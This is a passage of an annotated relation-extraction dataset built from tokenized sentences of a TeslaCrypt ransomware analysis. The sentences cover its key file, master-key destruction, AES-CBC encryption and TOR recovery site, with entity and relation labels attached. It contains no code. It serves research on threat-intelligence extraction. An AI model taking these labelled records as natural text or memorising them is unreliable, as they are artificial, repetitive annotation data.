"server", ",", "the", "dropper", "will", "proceed", "with", "the", "destruction", "of", "the", "master", "key", "inside", "the", "``", "key.dat", "''", "file", ",", "after", "the", "encryption", "of", "all", "files", "has", "been", "completed", "."], ["To", "recover", "the", "files", ",", "the", "user", "would", "have", "to", "connect", "to", "the", "threat", "actor", "'", "s", "TOR", "website", "and", "provide", "the", "recovery", "key", "."], ["The", "code", "for", "the", "encryption", "thread", "takes", "the", "shifted", "master", "key", ",", "calculates", "its", "SHA256", "hash", "and", "starts", "to", "enumerate", "all", "files", "of", "the", "victim", "workstation", "(", "filtering", "by", "extension", "type", ",", "Tesla", "Crypt", "supports", "over", "170", "different", "file", "extensions", ")", "."]], "vertexSet": [[{"type": "TF", "sent_id": 0, "global_pos": [1, 1], "name": "master key", "pos": [1, 3], "index": "0_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [5, 5], "name": "payment key", "pos": [5, 7], "index": "1_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [22, 22], "name": "SHA256", "pos": [22, 23], "index": "2_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [28, 28], "name": "custom algorithm", "pos": [28, 30], "index": "3_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [44, 44], "name": "shifted SHA256 values", "pos": [2, 5], "index": "4_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [52, 52], "name": "key.dat", "pos": [10, 11], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [60, 60], "name": "OpenKeyFileAndWrite", "pos": [4, 5], "index": "6_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [68, 68], "name": "key.dat", "pos": [12, 13], "index": "7_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [130, 130], "name": "key.dat", "pos": [11, 12], "index": "8_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [149, 149], "name": "TeslaCrypt", "pos": [30, 31], "index": "9_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [155, 155], "name": "dropper", "pos": [36, 37], "index": "10_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [159, 159], "name": "RECOVERY_KEY", "pos": [40, 41], "index": "11_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [172, 172], "name": "victim", "pos": [11, 12], "index": "12_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [179, 179], "name": "firewall", "pos": [18, 19], "index": "13_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [182, 182], "name": "communication", "pos": [21, 22], "index": "14_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [185, 185], "name": "C & C server", "pos": [24, 28], "index": "15_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [191, 191], "name": "dropper", "pos": [30, 31], "index": "16_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [204, 204], "name": "key.dat", "pos": [43, 44], "index": "17_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [219, 219], "name": "recover the files", "pos": [1, 4], "index": "18_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [224, 224], "name": "user", "pos": [6, 7], "index": "19_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [235, 235], "name": "TOR website", "pos": [17, 19], "index": "20_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [240, 240], "name": "recovery key", "pos": [22, 24], "index": "21_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [247, 247], "name": "encryption thread", "pos": [4, 6], "index": "22_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [251, 251], "name": "shifted master key", "pos": [8, 11], "index": "23_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [257, 257], "name": "SHA256 hash", "pos": [14, 16], "index": "24_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [264, 264], "name": "files of the victim", "pos": [21, 25], "index": "25_0"}]], "labels": [{"r": "CO", "evidence": [1, 2], "h": 5, "t": 7}, {"r": "RD", "evidence": [2], "h": 6, "t": 7}, {"r": "RD", "evidence": [1, 2, 3, 4], "t": 5, "h": 9}, {"r": "WR", "evidence": [4], "h": 10, "t": 11}, {"r": "CO", "evidence": [1, 2, 3, 4], "t": 5, "h": 8}, {"r": "UK", "evidence": [5], "h": 12, "t": 14}, {"r": "UK", "evidence": [5], "h": 16, "t": 17}, {"r": "CO", "evidence": [5, 6], "h": 12, "t": 19}, {"r": "FR", "evidence": [6], "t": 18, "h": 19}, {"r": "ST", "evidence": [6], "h": 19, "t": 20}, {"r": "WR", "evidence": [6], "h": 19, "t": 21}, {"r": "RD", "evidence": [7], "h": 22, "t": 23}, {"r": "WR", "evidence": [7], "h": 22, "t": 24}, {"r": "RD", "evidence": [7], "h": 22, "t": 25}]}, {"title": "663-20", "sents": [["The", "two", "shifted", "SHA256", "values", "are", "stored", "in", "the", "``", "key.dat", "''", "file", "."], ["The", "Key", "FileThe", "``", "OpenKeyFileAndWrite", "''", "routine", "tries", "to", "open", "the", "``", "key.dat", "''", "file", ",", "located", "in", "the", "user", "'", "s", "Application", "Data", "directory", "."], ["If", "it", "doesn", "'", "t", "exist", ",", "it", "generates", "the", "2", "master", "keys", "(", "3", "in", "case", "of", "the", "most", "recent", "dropper", ")", "as", "well", "as", "other", "keys", ",", "and", "stores", "them", "in", "the", "key", "file", "."], ["Here", "is", "a", "little", "schema", "of", "the", "layout", "of", "the", "``", "key.dat", "''", "file", ":", "*", "=", "We", "currently", "don", "'", "t", "know", "precisely", "how", "this", "value", "is", "used", "by", "TeslaCrypt", "The", "latest", "version", "of", "the", "dropper", "creates", "a", "``", "RECOVERY_KEY", "."], ["It", "does", "this", "to", "achieve", "a", "particular", "goal", ":", "if", "the", "victim", "workstation", "is", "offline", "or", "if", "a", "firewall", "blocks", "the", "communication", "with", "the", "C", "&", "C", "server", ",", "the", "dropper", "will", "proceed", "with", "the", "destruction", "of", "the", "master", "key", "inside", "the", "``", "key.dat", "''", "file", ",", "after", "the", "encryption", "of", "all", "files", "has", "been", "completed", "."], ["To", "recover", "the", "files", ",", "the", "user", "would", "have", "to", "connect", "to", "the", "threat", "actor", "'", "s", "TOR", "website", "and", "provide", "the", "recovery", "key", "."], ["The", "code", "for", "the", "encryption", "thread", "takes", "the", "shifted", "master", "key", ",", "calculates", "its", "SHA256", "hash", "and", "starts", "to", "enumerate", "all", "files", "of", "the", "victim", "workstation", "(", "filtering", "by", "extension", "type", ",", "Tesla", "Crypt", "supports", "over", "170", "different", "file", "extensions", ")", "."], ["It", ":", "generates", "a", "16-bytes", "Initialization", "Vector", "for", "AES", ",", "using", "the", "GetAndHashOsData", "API", "functionreads", "the", "target", "fileinitializes", "the", "AES", "encryption", "algorithm", "through", "the", "creation", "of", "the", "AES", "context", "data", "structurefinally", "encrypts", "the", "contents", "of", "the", "file", "using", "an", "AES", "CBC", "256-bit", "algorithm", "implemented", "in", "the", "``", "EncryptWithCbcAes", "''", "function", "."]], "vertexSet": [[{"type": "TF", "sent_id": 0, "global_pos": [2, 2], "name": "shifted SHA256 values", "pos": [2, 5], "index": "0_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [10, 10], "name": "key.dat", "pos": [10, 11], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [18, 18], "name": "OpenKeyFileAndWrite", "pos": [4, 5], "index": "2_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [26, 26], "name": "key.dat", "pos": [12, 13], "index": "3_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [88, 88], "name": "key.dat", "pos": [11, 12], "index": "4_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [107, 107], "name": "TeslaCrypt", "pos": [30, 31], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [113, 113], "name": "dropper", "pos": [36, 37], "index": "6_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [117, 117], "name": "RECOVERY_KEY", "pos": [40, 41], "index": "7_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [130, 130], "name": "victim", "pos": [11, 12], "index": "8_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [137, 137], "name": "firewall", "pos": [18, 19], "index": "9_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [140, 140], "name": "communication", "pos": [21, 22], "index": "10_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [143, 143], "name": "C & C server", "pos": [24, 28], "index": "11_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [149, 149], "name": "dropper", "pos": [30, 31], "index": "12_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [162, 162], "name": "key.dat", "pos": [43, 44], "index": "13_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [177, 177], "name": "recover the files", "pos": [1, 4], "index": "14_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [182, 182], "name": "user", "pos": [6, 7], "index": "15_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [193, 193], "name": "TOR website", "pos": [17, 19], "index": "16_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [198, 198], "name": "recovery key", "pos": [22, 24], "index": "17_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [205, 205], "name": "encryption thread", "pos": [4, 6], "index": "18_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [209, 209], "name": "shifted master key", "pos": [8, 11], "index": "19_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [215, 215], "name": "SHA256 hash", "pos": [14, 16], "index": "20_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [222, 222], "name": "files of the victim", "pos": [21, 25], "index": "21_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [243, 243], "name": "It", "pos": [0, 1], "index": "22_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [248, 248], "name": "Initialization Vector", "pos": [5, 7], "index": "23_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [255, 255], "name": "GetAndHashOsData API", "pos": [12, 14], "index": "24_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [259, 259], "name": "target fileinitializes", "pos": [16, 18], "index": "25_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [270, 270], "name": "AES context data", "pos": [27, 30], "index": "26_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [282, 282], "name": "AES CBC 256-bit", "pos": [39, 42], "index": "27_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [290, 290], "name": "EncryptWithCbcAes", "pos": [47, 48], "index": "28_0"}]], "labels": [{"r": "CO", "evidence": [0, 1], "h": 1, "t": 3}, {"r": "RD", "evidence": [1], "h": 2, "t": 3}, {"r": "RD", "evidence": [0, 1, 2, 3], "t": 1, "h": 5}, {"r": "WR", "evidence": [3], "h": 6, "t": 7}, {"r": "CO", "evidence": [0, 1, 2, 3], "t": 1, "h": 4}, {"r": "UK", "evidence": [4], "h": 8, "t": 10}, {"r": "UK", "evidence": [4], "h": 12, "t": 13}, {"r": "CO", "evidence": [4, 5], "h": 8, "t": 15}, {"r": "FR", "evidence": [5], "t": 14, "h": 15}, {"r": "ST", "evidence": [5], "h": 15, "t": 16}, {"r": "WR", "evidence": [5], "h": 15, "t": 17}, {"r": "RD", "evidence": [6], "h": 18, "t": 19}, {"r": "WR", "evidence": [6], "h": 18, "t": 20}, {"r": "RD", "evidence": [6], "h": 18, "t": 21}, {"r": "CO", "evidence": [6, 7], "h": 18, "t": 22}, {"r": "WR", "evidence": [7], "h": 22, "t": 23}, {"r": "EX", "evidence": [7], "h": 22, "t": 24}, {"r": "RD", "evidence": [7], "h": 22, "t": 25}, {"r": "WR", "evidence": [7], "h": 22, "t": 26}, {"r": "WR", "evidence": [7], "h": 22, "t": 27}, {"r": "EX", "evidence": [7], "h": 22, "t": 28}]}, {"title": "663-21", "sents": [["The", "Key", "FileThe", "``", "OpenKeyFileAndWrite", "''", "routine", "tries", "to", "open", "the", "``", "key.dat", "''", "file", ",", "located", "in", "the", "user", "'", "s", "Application", "Data", "directory", "."], ["If", "it", "doesn", "'", "t", "exist", ",", "it", "generates", "the", "2", "master", "keys", "(", "3", "in", "case", "of", "the", "most", "recent", "dropper", ")", "as", "well", "as", "other", "keys", ",", "and", "stores", "them", "in", "the", "key", "file", "."], ["Here", "is", "a", "little", "schema", "of", "the", "layout", "of", "the", "``", "key.dat", "''", "file", ":", "*", "=", "We", "currently", "don", "'", "t", "know", "precisely", "how", "this", "value", "is", "used", "by", "TeslaCrypt", "The", "latest", "version", "of", "the", "dropper", "creates", "a", "``", "RECOVERY_KEY", "."], ["It", "does", "this", "to", "achieve", "a", "particular", "goal", ":", "if", "the", "victim", "workstation", "is", "offline", "or", "if", "a", "firewall", "blocks", "the", "communication", "with", "the", "C", "&", "C", "server", ",", "the", "dropper", "will", "proceed", "with", "the", "destruction", "of", "the", "master", "key", "inside", "the", "``", "key.dat", "''", "file", ",", "after", "the", "encryption", "of", "all", "files", "has", "been", "completed", "."], ["To", "recover", "the", "files", ",", "the", "user", "would", "have", "to", "connect", "to", "the", "threat", "actor", "'", "s", "TOR", "website", "and", "provide", "the", "recovery", "key", "."], ["The", "code", "for", "the", "encryption", "thread", "takes", "the", "shifted", "master", "key", ",", "calculates", "its", "SHA256", "hash", "and", "starts", "to", "enumerate", "all", "files", "of", "the", "victim", "workstation", "(", "filtering", "by", "extension", "type", ",", "Tesla", "Crypt", "supports", "over", "170", "different", "file", "extensions", ")", "."], ["It", ":", "generates", "a", "16-bytes", "Initialization", "Vector", "for", "AES", ",", "using", "the", "GetAndHashOsData", "API", "functionreads", "the", "target", "fileinitializes", "the", "AES", "encryption", "algorithm", "through", "the", "creation", "of", "the", "AES", "context", "data", "structurefinally", "encrypts", "the", "contents", "of", "the", "file", "using", "an", "AES", "CBC", "256-bit", "algorithm", "implemented", "in", "the", "``", "EncryptWithCbcAes", "''", "function", "."], ["When", "the", "process", "is", "complete", ",", "the", "new", "encrypted", "file", "is", "created", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [4, 4], "name": "OpenKeyFileAndWrite", "pos": [4, 5], "index": "0_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [12, 12], "name": "key.dat", "pos": [12, 13], "index": "1_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [74, 74], "name": "key.dat", "pos": [11, 12], "index": "2_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [93, 93], "name": "TeslaCrypt", "pos": [30, 31], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [99, 99], "name": "dropper", "pos": [36, 37], "index": "4_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [103, 103], "name": "RECOVERY_KEY", "pos": [40, 41], "index": "5_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [116, 116], "name": "victim", "pos": [11, 12], "index": "6_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [123, 123], "name": "firewall", "pos": [18, 19], "index": "7_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [126, 126], "name": "communication", "pos": [21, 22], "index": "8_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [129, 129], "name": "C & C server", "pos": [24, 28], "index": "9_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [135, 135], "name": "dropper", "pos": [30, 31], "index": "10_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [148, 148], "name": "key.dat", "pos": [43, 44], "index": "11_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [163, 163], "name": "recover the files", "pos": [1, 4], "index": "12_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [168, 168], "name": "user", "pos": [6, 7], "index": "13_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [179, 179], "name": "TOR website", "pos": [17, 19], "index": "14_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [184, 184], "name": "recovery key", "pos": [22, 24], "index": "15_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [191, 191], "name": "encryption thread", "pos": [4, 6], "index": "16_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [195, 195], "name": "shifted master key", "pos": [8, 11], "index": "17_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [201, 201], "name": "SHA256 hash", "pos": [14, 16], "index": "18_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [208, 208], "name": "files of the victim", "pos": [21, 25], "index": "19_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [229, 229], "name": "It", "pos": [0, 1], "index": "20_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [234, 234], "name": "Initialization Vector", "pos": [5, 7], "index": "21_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [241, 241], "name": "GetAndHashOsData API", "pos": [12, 14], "index": "22_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [245, 245], "name": "target fileinitializes", "pos": [16, 18], "index": "23_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [256, 256], "name": "AES context data", "pos": [27, 30], "index": "24_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [268, 268], "name": "AES CBC 256-bit", "pos": [39, 42], "index": "25_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [276, 276], "name": "EncryptWithCbcAes", "pos": [47, 48], "index": "26_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [282, 282], "name": "process", "pos": [2, 3], "index": "27_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [287, 287], "name": "new encrypted file", "pos": [7, 10], "index": "28_0"}]], "labels": [{"r": "RD", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [2], "h": 4, "t": 5}, {"r": "UK", "evidence": [3], "h": 6, "t": 8}, {"r": "UK", "evidence": [3], "h": 10, "t": 11}, {"r": "CO", "evidence": [3, 4], "h": 6, "t": 13}, {"r": "FR", "evidence": [4], "t": 12, "h": 13}, {"r": "ST", "evidence": [4], "h": 13, "t": 14}, {"r": "WR", "evidence": [4], "h": 13, "t": 15}, {"r": "RD", "evidence": [5], "h": 16, "t": 17}, {"r": "WR", "evidence": [5], "h": 16, "t": 18}, {"r": "RD", "evidence": [5], "h": 16, "t": 19}, {"r": "CO", "evidence": [5, 6], "h": 16, "t": 20}, {"r": "CO", "evidence": [5, 6, 7], "h": 16, "t": 27}, {"r": "WR", "evidence": [6], "h": 20, "t": 21}, {"r": "EX", "evidence": [6], "h": 20, "t": 22}, {"r": "RD", "evidence": [6], "h": 20, "t": 23}, {"r": "WR", "evidence": [6], "h": 20, "t": 24}, {"r": "WR", "evidence": [6], "h": 20, "t": 25}, {"r": "EX", "evidence": [6], "h": 20, "t": 26}, {"r": "WR", "evidence": [7], "h": 27, "t": 28}]}, {"title": "663-22", "sents": [["If", "it", "doesn", "'", "t", "exist", ",", "it", "generates", "the", "2", "master", "keys", "(", "3", "in", "case", "of", "the", "most", "recent", "dropper", ")", "as", "well", "as", "other", "keys", ",", "and", "stores", "them", "in", "the", "key", "file", "."], ["Here", "is", "a", "little", "schema", "of", "the", "layout", "of", "the", "``", "key.dat", "''", "file", ":", "*", "=", "We", "currently", "don", "'", "t", "know", "precisely", "how", "this", "value", "is", "used", "by", "TeslaCrypt", "The", "latest", "version", "of", "the", "dropper", "creates", "a", "``", "RECOVERY_KEY", "."], ["It", "does", "this", "to", "achieve", "a", "particular", "goal", ":", "if", "the", "victim", "workstation", "is", "offline", "or", "if", "a", "firewall", "blocks", "the", "communication", "with", "the", "C", "&", "C", "server", ",", "the", "dropper", "will", "proceed", "with", "the", "destruction", "of", "the", "master", "key", "inside", "the", "``", "key.dat", "''", "file", ",", "after", "the", "encryption", "of", "all", "files", "has", "been", "completed", "."], ["To", "recover", "the", "files", ",", "the", "user", "would", "have", "to", "connect", "to", "the", "threat", "actor", "'", "s", "TOR", "website", "and", "provide", "the", "recovery", "key", "."], ["The", "code", "for", "the", "encryption", "thread", "takes", "the", "shifted", "master", "key", ",", "calculates", "its", "SHA256", "hash", "and", "starts", "to", "enumerate", "all", "files", "of", "the", "victim", "workstation", "(", "filtering", "by", "extension", "type", ",", "Tesla", "Crypt", "supports", "over", "170", "different", "file", "extensions", ")", "."], ["It", ":", "generates", "a", "16-bytes", "Initialization", "Vector", "for", "AES", ",", "using", "the", "GetAndHashOsData", "API", "functionreads", "the", "target", "fileinitializes", "the", "AES", "encryption", "algorithm", "through", "the", "creation", "of", "the", "AES", "context", "data", "structurefinally", "encrypts", "the", "contents", "of", "the", "file", "using", "an", "AES", "CBC", "256-bit", "algorithm", "implemented", "in", "the", "``", "EncryptWithCbcAes", "''", "function", "."], ["When", "the", "process", "is", "complete", ",", "the", "new", "encrypted", "file", "is", "created", "."], ["The", "new", "file", "contains", "a", "small", "header", "(", "composed", "of", "the", "AES", "Initialization", "Vector", "in", "its", "first", "16", "bytes", "followed", "by", "the", "original", "file", "size", "in", "the", "next", "4", "bytes", ")", ",", "and", "then", "the", "actual", "encrypted", "bytes", "."]], "vertexSet": [[{"type": "TF", "sent_id": 1, "global_pos": [48, 48], "name": "key.dat", "pos": [11, 12], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [67, 67], "name": "TeslaCrypt", "pos": [30, 31], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [73, 73], "name": "dropper", "pos": [36, 37], "index": "2_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [77, 77], "name": "RECOVERY_KEY", "pos": [40, 41], "index": "3_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [90, 90], "name": "victim", "pos": [11, 12], "index": "4_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [97, 97], "name": "firewall", "pos": [18, 19], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [100, 100], "name": "communication", "pos": [21, 22], "index": "6_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [103, 103], "name": "C & C server", "pos": [24, 28], "index": "7_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [109, 109], "name": "dropper", "pos": [30, 31], "index": "8_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [122, 122], "name": "key.dat", "pos": [43, 44], "index": "9_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [137, 137], "name": "recover the files", "pos": [1, 4], "index": "10_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [142, 142], "name": "user", "pos": [6, 7], "index": "11_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [153, 153], "name": "TOR website", "pos": [17, 19], "index": "12_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [158, 158], "name": "recovery key", "pos": [22, 24], "index": "13_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [165, 165], "name": "encryption thread", "pos": [4, 6], "index": "14_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [169, 169], "name": "shifted master key", "pos": [8, 11], "index": "15_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [175, 175], "name": "SHA256 hash", "pos": [14, 16], "index": "16_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [182, 182], "name": "files of the victim", "pos": [21, 25], "index": "17_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [203, 203], "name": "It", "pos": [0, 1], "index": "18_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [208, 208], "name": "Initialization Vector", "pos": [5, 7], "index": "19_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [215, 215], "name": "GetAndHashOsData API", "pos": [12, 14], "index": "20_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [219, 219], "name": "target fileinitializes", "pos": [16, 18], "index": "21_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [230, 230], "name": "AES context data", "pos": [27, 30], "index": "22_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [242, 242], "name": "AES CBC 256-bit", "pos": [39, 42], "index": "23_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [250, 250], "name": "EncryptWithCbcAes", "pos": [47, 48], "index": "24_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [256, 256], "name": "process", "pos": [2, 3], "index": "25_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [261, 261], "name": "new encrypted file", "pos": [7, 10], "index": "26_0"}]], "labels": [{"r": "WR", "evidence": [1], "h": 2, "t": 3}, {"r": "UK", "evidence": [2], "h": 4, "t": 6}, {"r": "UK", "evidence": [2], "h": 8, "t": 9}, {"r": "CO", "evidence": [2, 3], "h": 4, "t": 11}, {"r": "FR", "evidence": [3], "t": 10, "h": 11}, {"r": "ST", "evidence": [3], "h": 11, "t": 12}, {"r": "WR", "evidence": [3], "h": 11, "t": 13}, {"r": "RD", "evidence": [4], "h": 14, "t": 15}, {"r": "WR", "evidence": [4], "h": 14, "t": 16}, {"r": "RD", "evidence": [4], "h": 14, "t": 17}, {"r": "CO", "evidence": [4, 5], "h": 14, "t": 18}, {"r": "CO", "evidence": [4, 5, 6], "h": 14, "t": 25}, {"r": "WR", "evidence": [5], "h": 18, "t": 19}, {"r": "EX", "evidence": [5], "h": 18, "t": 20}, {"r": "RD", "evidence": [5], "h": 18, "t": 21}, {"r": "WR", "evidence": [5], "h": 18, "t": 22}, {"r": "WR", "evidence": [5], "h": 18, "t": 23}, {"r": "EX", "evidence": [5], "h": 18, "t": 24}, {"r": "WR", "evidence": [6], "h": 25, "t": 26}]}, {"title": "663-23", "sents": [["Here", "is", "a", "little", "schema", "of", "the", "layout", "of", "the", "``", "key.dat", "''", "file", ":", "*", "=", "We", "currently", "don", "'", "t", "know", "precisely", "how", "this", "value", "is", "used", "by", "TeslaCrypt", "The", "latest", "version", "of", "the", "dropper", "creates", "a", "``", "RECOVERY_KEY", "."], ["It", "does", "this", "to", "achieve", "a", "particular", "goal", ":", "if", "the", "victim", "workstation", "is", "offline", "or", "if", "a", "firewall", "blocks", "the", "communication", "with", "the", "C", "&", "C", "server", ",", "the", "dropper", "will", "proceed", "with", "the", "destruction", "of", "the", "master", "key", "inside", "the", "``", "key.dat", "''", "file", ",", "after", "the", "encryption", "of", "all", "files", "has", "been", "completed", "."], ["To", "recover", "the", "files", ",", "the", "user", "would", "have", "to", "connect", "to", "the", "threat", "actor", "'", "s", "TOR", "website", "and", "provide", "the", "recovery", "key", "."], ["The", "code", "for", "the", "encryption", "thread", "takes", "the", "shifted", "master", "key", ",", "calculates", "its", "SHA256", "hash", "and", "starts", "to", "enumerate", "all", "files", "of", "the", "victim", "workstation", "(", "filtering", "by", "extension", "type", ",", "Tesla", "Crypt", "supports", "over", "170", "different", "file", "extensions", ")", "."], ["It", ":", "generates", "a", "16-bytes", "Initialization", "Vector", "for", "AES", ",", "using", "the", "GetAndHashOsData", "API", "functionreads", "the", "target", "fileinitializes", "the", "AES", "encryption", "algorithm", "through", "the", "creation", "of", "the", "AES", "context", "data", "structurefinally", "encrypts", "the", "contents", "of", "the", "file", "using", "an", "AES", "CBC", "256-bit", "algorithm", "implemented", "in", "the", "``", "EncryptWithCbcAes", "''", "function", "."], ["When", "the", "process", "is", "complete", ",", "the", "new", "encrypted", "file", "is", "created", "."], ["The", "new", "file", "contains", "a", "small", "header", "(", "composed", "of", "the", "AES", "Initialization", "Vector", "in", "its", "first", "16", "bytes", "followed", "by", "the", "original", "file", "size", "in", "the", "next", "4", "bytes", ")", ",", "and", "then", "the", "actual", "encrypted", "bytes", "."], ["It", "needs", "the", "``", "key.dat", "''", "file", "to", "properly", "recover", "the", "master", "key", "used", "for", "file", "encryption", "."]], "vertexSet": [[{"type": "TF", "sent_id": 0, "global_pos": [11, 11], "name": "key.dat", "pos": [11, 12], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [30, 30], "name": "TeslaCrypt", "pos": [30, 31], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [36, 36], "name": "dropper", "pos": [36, 37], "index": "2_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [40, 40], "name": "RECOVERY_KEY", "pos": [40, 41], "index": "3_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [53, 53], "name": "victim", "pos": [11, 12], "index": "4_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [60, 60], "name": "firewall", "pos": [18, 19], "index": "5_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [63, 63], "name": "communication", "pos": [21, 22], "index": "6_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [66, 66], "name": "C & C server", "pos": [24, 28], "index": "7_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [72, 72], "name": "dropper", "pos": [30, 31], "index": "8_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [85, 85], "name": "key.dat", "pos": [43, 44], "index": "9_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [100, 100], "name": "recover the files", "pos": [1, 4], "index": "10_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [105, 105], "name": "user", "pos": [6, 7], "index": "11_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [116, 116], "name": "TOR website", "pos": [17, 19], "index": "12_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [121, 121], "name": "recovery key", "pos": [22, 24], "index": "13_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [128, 128], "name": "encryption thread", "pos": [4, 6], "index": "14_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [132, 132], "name": "shifted master key", "pos": [8, 11], "index": "15_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [138, 138], "name": "SHA256 hash", "pos": [14, 16], "index": "16_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [145, 145], "name": "files of the victim", "pos": [21, 25], "index": "17_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [166, 166], "name": "It", "pos": [0, 1], "index": "18_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [171, 171], "name": "Initialization Vector", "pos": [5, 7], "index": "19_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [178, 178], "name": "GetAndHashOsData API", "pos": [12, 14], "index": "20_0"}], [{"type": "TF", "sent_id": 4, "global_pos": 